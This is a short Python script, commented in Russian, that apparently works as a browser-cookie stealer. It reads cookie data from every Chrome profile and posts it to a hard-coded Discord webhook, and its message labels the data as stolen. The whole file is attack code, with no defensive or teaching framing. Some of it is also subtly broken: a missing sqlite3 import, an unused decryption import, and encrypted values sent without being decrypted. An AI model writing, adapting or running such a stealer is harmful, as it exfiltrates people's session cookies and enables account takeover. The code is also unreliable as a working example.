import requests
import os
from win32crypt import CryptUnprotectData  # Для расшифровки паролей

# Ваш Discord-вебхук (из вашего URL)
WEBHOOK_URL = "https://discord.com/api/webhooks/1573428258861482205/RYrEW_HDXRU2HX-uORpMnUIt67wSmdpEm9yNBE0Wfo003Gv2WT_6lvdr60giD6ZETYQr"

def get_chrome_cookies():
    data = []
    path = f"{os.getenv('APPDATA')}\\Google\\Chrome\\User Data"
    for profile in os.listdir(path):
        if 'Profile' not in profile and profile != 'Default':
            continue
        cookies_db = f"{path}\\{profile}\\Network\\Cookies"
        try:
            conn = sqlite3.connect(cookies_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM Cookies")
            for row in cursor.fetchall():
                data.append(f"Cookie: {row[2]} (domain: {row[0]})")
        except Exception as e:
            pass
    return data

def send_to_discord(message):
    payload = {
        "content": f"Новые данные с краду:\n```{message}```"
    }
    requests.post(WEBHOOK_URL, json=payload)

if __name__ == "__main__":
    cookies = get_chrome_cookies()
    if cookies:
        send_to_discord("\n".join(cookies))
